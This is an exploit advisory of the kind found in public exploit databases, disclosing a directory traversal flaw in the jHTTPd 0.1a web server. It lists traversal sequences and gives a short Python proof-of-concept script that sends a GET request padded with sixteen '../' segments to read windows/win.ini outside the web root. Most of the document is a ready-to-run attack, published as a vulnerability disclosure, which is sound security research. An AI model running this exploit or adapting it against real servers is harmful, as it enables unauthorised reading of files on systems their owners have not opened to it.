# Software................jHTTPd 0.1a
# Vulnerability...........Directory Traversal
# Threat Level............Serious (3/5)
# Download................http://developer.gauner.org/jhttpd/
# Discovery Date..........3/28/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
#
#
# --Description--
#
# A directory traversal vulnerability in jHTTPd 0.1a can be exploited to
# read files outside of the web root.
#
#
# --Exploit--
#
# ..\/
# ..//
# ..\
# ../
#
#
# --PoC--
 
import socket, urllib
 
host = &#039;localhost&#039;
port = 8082
file = &#039;windows/win.ini&#039;
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)   
 
print &#039;sending&#039;
 
s.send(&#039;GET &#039; + &#039;../&#039; * 16 + file + &#039; HTTP/1.1\r\n&#039;
    &#039;Host: &#039; + host + &#039;\r\n\r\n&#039;)
print s.recv(8192) + s.recv(8192)



